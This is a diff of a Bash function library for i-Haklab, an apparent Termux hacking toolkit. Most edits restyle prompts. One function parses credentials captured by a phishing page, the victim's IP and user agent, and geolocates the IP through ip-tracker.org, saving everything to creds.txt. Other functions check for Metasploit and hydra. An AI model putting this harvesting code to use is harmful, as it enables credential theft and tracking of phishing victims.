@@ -4,11 +4,12 @@
 iHAKLAB=/data/data/com.termux/files/home/.local/share/i-Haklab
 
 banner() {
-	if [ ! -e $iHAKLAB/.set/libexec/banner/i-Haklab ]; then
+	if [[ ! -e $iHAKLAB/.set/libexec/banner/i-Haklab ]]
+	then
 		wget https://raw.githubusercontent.com/ivam3/i-Haklab/master/.set/libexec/banner/i-Haklab -O $iHAKLAB/.set/libexec/banner/i-Haklab > /dev/null 2>&1
 	fi
-        bash $iHAKLAB/.set/libexec/banner/i-Haklab
-        sleep 0.5
+	bash $iHAKLAB/.set/libexec/banner/i-Haklab
+  sleep 0.5
 }
 export -f banner
 
@@ -21,29 +22,38 @@ k-boom() {
 export -f k-boom
 
 running(){
-        for i in . .. ... ....;do
-                printf "$G$(clear)(_>)─➤ i-Haklab running $i\n$W"
-                sleep 0.1
-        done
+	sleep $1 &
+	pid=$!
+  spinner=( '█■■■■' '■█■■■' '■■█■■' '■■■█■' '■■■■█' )
+  while [ "$(ps a|awk '{print $1}'|grep $pid)" ]; do
+		for i in "${spinner[@]}";do
+			tput civis
+			printf  "$green\r(_➤) Searching\t$i\b\b\b\b\b\b\b\b";
+			sleep 0.25
+    done
+  done
+  tput cnorm
+  printf "\t$W[$G¡RUN!$W]\n";
 }
 export -f running
 
-STDERROOT(){ printf "$R\n(_>)─➤$W Rooted device required";exit;}
+STDERROOT(){ printf "$R\n(_➤)$W Rooted device required";exit;}
 export -f STDERROOT
 
-STDERR(){ printf "$R(_>)─➤$W missing argument, type i-Haklab -h for help";exit;}
+STDERR(){ printf "$R(_➤)$W missing argument, type i-Haklab -h for help";exit;}
 export -f STDERR
 
 APTupdate(){
 	for count in {1..4};do
-		if [[ $(apt update|grep "All packages are up to date.") ]]
+		if [[ $(apt update|grep "All packages are up to date.") ]] &>/dev/null
 		then
+			echo "All packages are up to date."
 			break
-		elif [[ count -eq 3 ]]
-    then
-			printf "$R\n(_>)─➤ APT ERROR$W |$Y try using IbyC-fixer$W";exit
+		elif [[ $count -eq 3 ]]; then
+			printf "$R\n(_➤) APT ERROR$W |$Y try using IbyC-fixer$W"
+			break
     else
-			yes|apt upgrade
+			yes|apt upgrade &>/dev/null
 		fi
 	done
 }
@@ -51,15 +61,15 @@ export -f APTupdate
 
 chk-iHaklab() {
 	until [ -d $iHAKLAB ]; do
-		printf "$R\n(_>)─➤ i-Haklab needed$W |$Y Do you wanna install it?$W\n"
+		printf "$R\n(_➤) i-Haklab needed$W |$Y Do you wanna install it?$W\n"
         	while read -p "(yes/no)─➤ " yesorno && [ -z $yesorno ]; do
                 	continue
         	done
         	if [ $yesorno = "yes" ] || [ $yesorno = "Yes" ] || [ $yesorno = "YES" ]; then
-                	git clone https://github.com/ivam3/i-Haklab.git $HOME/i-Haklab
-                	cd ~/i-Haklab;bash setup-lite
+                	git clone --quiet https://github.com/ivam3/i-Haklab.git $HOME/i-Haklab
+                	cd ~/i-Haklab;bash setup
         	else
-                	printf "$Goke\n(_>)─➤ Have a nice hacking day!!\n$W"
+                	printf "$Goke\n(_➤) Have a nice hacking day!!\n$W"
                 	exit
         	fi
 	done
@@ -68,7 +78,7 @@ export -f chk-iHaklab
 
 chk-Cuser() {
 	while [ ! $(id -u) -ne 0 ]; do
-        	printf "$R\n(_>)─➤$W You need to be a common user\n"
+        	printf "$R\n(_➤)$W You need to be a common user\n"
         	exit
 	done
 }
@@ -76,19 +86,19 @@ export -f chk-Cuser
 
 chk-Ruser() {
 	while [ ! $(id -u) -eq 0 ]; do
-		printf "$R\n(_>)─➤ You need to be a root user$W\n"
+		printf "$R\n(_➤) You need to be a root user$W\n"
 		exit
 	done
 }
 export -f chk-Ruser
 
 chk-api() {
-        command -v termux-open > /dev/null || { printf "$R(_>)─➤$W termux-tools needed$R |$W run i-Haklab install termux-tools"; exit; }
+        command -v termux-open > /dev/null || { printf "$R(_➤)$W termux-tools needed$R |$W run i-Haklab install termux-tools"; exit; }
 }
 export -f chk-api
 
 chk-sudo() {
-        command -v sudo > /dev/null || { printf "$R(_>)─➤$W sudo command needed$R |$W please install it"; exit; }
+        command -v sudo > /dev/null || { printf "$R(_➤)$W sudo command needed$R |$W please install it"; exit; }
 }
 export -f chk-sudo
 
@@ -104,39 +114,39 @@ export -f chk-root
 
 chk-network(){
         until ping -q -c1 -W 1 8.8.8.8 >/dev/null 2>/dev/null;do
-		printf "$R(_>)─➤ Please connect to internet$W\n"
+		printf "$R(_➤) Please connect to internet$W\n"
 		exit
 	done
 }
 export -f chk-network
 
 chk-msf() {
-        command -v msfconsole > /dev/null || { printf "$R\n(_>)─➤$W Metasploit needed$R |$W run i-Haklab install metasploit";exit; }
+        command -v msfconsole > /dev/null || { printf "$R\n(_➤)$W Metasploit needed$R |$W run i-Haklab install metasploit";exit; }
 }
 export -f chk-msf
 
 chk-java() {
-command -v java >/dev/null || { printf "$R\n(_>)$W java needed$R |$W run i-Haklab install java";exit; }
+         command -v java >/dev/null || { printf "$R\n(_>)$W java needed$R |$W run i-Haklab install java";exit; }
 }
 export -f chk-java
 
 chk-php() {
-        command -v php > /dev/null || { printf "$R\n(_>)─➤$W php not found$R |$W run i-Haklab install php"; exit; }
+        command -v php > /dev/null || { printf "$R\n(_➤)$W php not found$R |$W run i-Haklab install php"; exit; }
 }
 export -f chk-php
 
 chk-ssh() {
-        command -v ssh > /dev/null || { printf "$R\n(_>)─➤$W ssh not found$R |$W run i-Haklab install openssh"; exit; }
+        command -v ssh > /dev/null || { printf "$R\n(_➤)$W ssh not found$R |$W run i-Haklab install openssh"; exit; }
 }
 export -f chk-ssh
 
 chk-mega() {
-        command -v megadl > /dev/null || { printf "$R\n(_>)─➤$W megatools not found$R |$W run i-Haklab install megatools"; exit; }
+        command -v megadl > /dev/null || { printf "$R\n(_➤)$W megatools not found$R |$W run i-Haklab install megatools"; exit; }
 }
 export -f chk-mega
 
 chk-hydra() {
-        command -v hydra > /dev/null || { printf "$R\n(_>)─➤$W hydra not found$R |$W run i-Haklab install hydra"; exit; }
+        command -v hydra > /dev/null || { printf "$R\n(_➤)$W hydra not found$R |$W run i-Haklab install hydra"; exit; }
 }
 export -f chk-hydra
 
@@ -151,7 +161,7 @@ chk-tunnel() {
 	elif ping -q -c 1 -W 1 serverless.social >/dev/null 2>&1;then
 		TUNNEL="serverless.social"
 	else
-		printf "$R\n(_>)─➤$W Server not available$R |$W try it later\n"
+		printf "$R\n(_➤)$W Server not available$R |$W try it later\n"
 		exit
 	fi
 }
@@ -163,7 +173,7 @@ chk-snow() {
 export -f chk-snow
 
 Menu() {
-	printf "$Y\n(_>)─➤$W i-Haklab v.3.0 (c) 2021 by @Ivam3 - Is a hacking laboratory that contains open source tools recommended by Ivam3. If the law is violated with it's use, this would be the responsibility of the user who handled it.\n$Y\nSyntax:$W i-Haklab [-arg-] [-option-]\n
+	printf "$Y\n(_➤)$W i-Haklab $version (c) 2021 by @Ivam3 - Is a hacking laboratory that contains open source tools recommended by Ivam3. If the law is violated with it's use, this would be the responsibility of the user who handled it.\n$Y\nSyntax:$W i-Haklab [-arg-] [-option-]\n
 $Y OPTIONS$W|$Y   Arguments$W   |$Y    Description$W
 ╰─about─────+──<name─of─tool>───➤ Show informations about tool/framework
 |   ╰───example─────────────────{─i-Haklab about crunch─}
@@ -314,13 +324,13 @@ export -f trimString
 phishing-CredsResults() {
 	ACCOUNT=$(grep -o 'Account:.*' $TMP_PATH/usernames.txt | cut -d " " -f2)
 	if [ ! -z $ACCOUNT ]; then
-		printf "$G\n(_>)─➤ ACCOUNT:$W$ACCOUNT"
+		printf "$G\n(_➤) ACCOUNT:$W$ACCOUNT"
 		echo $ACCOUNT >> $TMP_PATH/creds.txt
 		sleep 0.5
 	fi
 	PASSWD=$(grep -o 'Pass:.*' $TMP_PATH/usernames.txt | cut -d " " -f2)
 	if [ ! -z $PASSWD ]; then
-		printf "$G\n(_>)─➤ PASSWORD:$W$PASSWD"
+		printf "$G\n(_➤) PASSWORD:$W$PASSWD"
 		echo $PASSWD >> $TMP_PATH/creds.txt
 		sleep 0.5
 	fi
@@ -332,62 +342,62 @@ IP=$(grep -a 'IP:' $TMP_PATH/ip.txt | cut -d " " -f2 | tr -d '\r' | head -n1)
 IPTRACKER=$(curl -s -L "www.ip-tracker.org/locator/ip-lookup.php?ip=$IP" --user-agent "Mozilla/5.0 (X11: Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" > $TMP_PATH/iptracker.log)
 
 if [ ! -z $IP ]; then 
-	printf "$G\n(_>)─➤ IP:$W$IP"
+	printf "$G\n(_➤) IP:$W$IP"
 	echo $IP >> $TMP_PATH/creds.txt
 	sleep 0.5
 fi
 
 UA=$(grep 'User-Agent:' $TMP_PATH/ip.txt | cut -d '"' -f2 | head -n1 | awk '{print $1 $2 $3 $4 $5 $6}')
 if [ ! -z $UA ]; then
-	printf "$G\n(_>)─➤ User Agent$W$UA"
+	printf "$G\n(_➤) User Agent$W$UA"
 	echo $UA >> $TMP_PATH/creds.txt
 	sleep 0.5
 fi
 IP_SPEED=$(grep -o "IP Address Speed:.*" $TMP_PATH/iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
 if [ ! -z '$IP_SPEED' ]; then
-	printf "$G\n(_>)─➤ IP Address speed:$W$IP_SPEED"
+	printf "$G\n(_➤) IP Address speed:$W$IP_SPEED"
 	echo $IP_SPEED >> $TMP_PATH/creds.txt
 	sleep 0.5
 fi
 IP_CURRENCY=$(grep -o "IP Currency:.*" $TMP_PATH/iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
 if [ ! -z '$IP_CURRENCY' ]; then
-	printf "$G\n(_>)─➤ IP Currency:$W$IP_CURRENCY"
+	printf "$G\n(_➤) IP Currency:$W$IP_CURRENCY"
 	echo $IP_CURRENCY >> $TMP_PATH/creds.txt
 	sleep 0.5
 fi
 CONTINENT=$(grep -o "Continent.*" $TMP_PATH/iptracker.log | cut -d ">" -f3 | cut -d "<" -f1)
 if [ ! -z '$CONTINENT' ]; then
-	printf "$G\n(_>)─➤ Continent:$W$CONTINENT"
+	printf "$G\n(_➤) Continent:$W$CONTINENT"
 	echo $CONTINENT >> $TMP_PATH/creds.txt
 	sleep 0.5
 fi
 COUNTRY=$(grep -o "Country:.*" $TMP_PATH/iptracker.log | cut -d ">" -f3 | cut -d "&" -f1)
 if [ ! -z $COUNTRY ]; then
-	printf "$G\n(_>)─➤ Country:$W$COUNTRY"
+	printf "$G\n(_➤) Country:$W$COUNTRY"
 	echo $COUNTRY >> $TMP_PATH/creds.txt
 	sleep 0.5
 fi
 STATE=$(grep -o "tracking lessimpt.*" $TMP_PATH/iptracker.log | cut -d "<" -f1 | cut -d ">" -f2)
 if [ ! -z '$STATE' ]; then
-	printf "$G\n(_>)─➤ State:$W$STATE"
+	printf "$G\n(_➤) State:$W$STATE"
 	echo $STATE >> $TMP_PATH/creds.txt
 	sleep 0.5
 fi
 CITY=$(grep -o "City Location:.*" $TMP_PATH/iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
 if [ ! -z $CITY ]; then
-	printf "$G\n(_>)─➤ City:$W$CITY"
+	printf "$G\n(_➤) City:$W$CITY"
 	echo $CITY >> $TMP_PATH/creds.txt
 	sleep 0.5
 fi
 ISP=$(grep -o "ISP:.*" $TMP_PATH/iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
 if [ ! -z $ISP ]; then
-	printf "$G\n(_>)─➤ ISP:$W$IPS"
+	printf "$G\n(_➤) ISP:$W$IPS"
 	echo $ISP >> $TMP_PATH/creds.txt
 	sleep 0.5
 fi
 AS_NUM=$(grep -o "AS Number" $TMP_PATH/iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
 if [ ! -z '$AS_NUM' ]; then
-	printf  "$G\n(_>)─➤ AS Number:$W$AS_NUM"
+	printf  "$G\n(_➤) AS Number:$W$AS_NUM"
 	echo $AS_NUM >> $TMP_PATH/creds.txt
 	sleep 0.5 
 fi
